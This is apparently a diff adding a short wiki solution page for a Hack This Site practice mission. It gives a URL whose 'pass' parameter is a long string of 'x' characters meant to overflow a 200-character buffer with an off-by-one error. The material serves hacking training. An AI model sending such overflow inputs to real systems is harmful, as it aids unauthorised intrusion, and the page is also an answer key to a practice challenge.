@@ -1,0 +1,4 @@
+To overflow the 200 character buffer you need 200 characters, but somebody has an off-by-one, so you need 201 characters:
+http://www.hackthissite.org/missions/extbasic/template.php?lvl=1&pass=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+
+[[Category:Hack This Site]]
